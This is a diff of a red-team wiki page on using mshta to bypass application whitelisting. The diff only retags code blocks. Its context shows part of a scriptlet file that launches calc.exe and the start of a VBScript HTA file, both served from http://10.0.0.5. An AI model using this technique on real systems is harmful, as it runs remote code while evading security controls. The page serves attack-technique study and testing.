@@ -9,7 +9,7 @@ description: MSHTA code execution - bypass application whitelisting.
 Writing a scriptlet file that will launch calc.exe when invoked:
 
 {% code title="<http://10.0.0.5/m.sct>" %}
-```markup
+```shellscript
 <?XML version="1.0"?>
 <scriptlet>
 <registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
@@ -67,7 +67,7 @@ or by navigating to the file itself, launching it and clicking run:
 ![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHKNg9WNwld275SXV7v%2F-LHKOJ_6AwX7wGoW84pc%2Fmshta-url.png?alt=media\&token=4ee7abd5-14ec-4c40-90be-c75c55cdae4d)
 
 {% code title="<http://10.0.0.5/m.hta>" %}
-```markup
+```shellscript
 <html>
 <head>
 <script language="VBScript"> 
